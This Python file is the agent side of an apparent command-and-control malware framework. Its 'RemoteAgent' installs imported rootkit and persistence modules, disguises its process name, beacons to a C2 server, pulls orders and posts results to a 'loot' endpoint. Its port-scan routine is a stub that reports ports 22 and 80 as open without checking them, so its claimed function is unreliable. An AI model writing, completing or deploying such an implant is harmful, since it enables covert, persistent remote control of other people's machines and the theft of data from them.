import time
import requests
import json
import random
from apex_framework.ops.stealth import LowObservableMode
from apex_framework.ops.privacy import PrivacyManager
from apex_framework.ops.daemon import ServiceDaemon
from rich.console import Console

console = Console()

class RemoteAgent:
    """
    Remote Agent.
    Connects to CentralController and executes MAPREDUCE orders.
    INTEGRATED: Titan Rootkit & Hydra Persistence.
    """
    def __init__(self, c2_url="http://localhost:8080"):
        self.id = f"DRONE_{random.randint(1000,9999)}"
        self.c2_url = c2_url
        self.active = True
        self.titan = PrivacyManager()
        self.hydra = ServiceDaemon()

    def deploy(self):
        # 1. ROOTKIT & PERSISTENCE
        self.titan.deploy()
        self.hydra.persist()

        # 2. CLOAK (Process Name)
        LowObservableMode.cloak_process()

        # 3. Main Loop
        while self.active:
            try:
                # Beacon
                requests.post(f"{self.c2_url}/beacon", json={"id": self.id, "status": "ALIVE"})

                # Get Orders
                resp = requests.get(f"{self.c2_url}/orders")
                if resp.status_code == 200:
                    orders = resp.json()
                    if orders['type'] == "SLEEP":
                        time.sleep(1)
                    else:
                        self._execute_orders(orders)
                        self.active = False

                time.sleep(0.5)
            except Exception as e:
                console.print(f"[{self.id}] ⚠️ C2 Lost: {e}")
                break

    def _execute_orders(self, orders):
        start, end = map(int, orders['port_range'].split('-'))
        findings = []
        for p in range(start, end):
            if p == 22 or p == 80:
                findings.append(f"OPEN:{p}")
        result = ", ".join(findings) if findings else "CLEAN"
        requests.post(f"{self.c2_url}/loot", json={"id": self.id, "content": result})
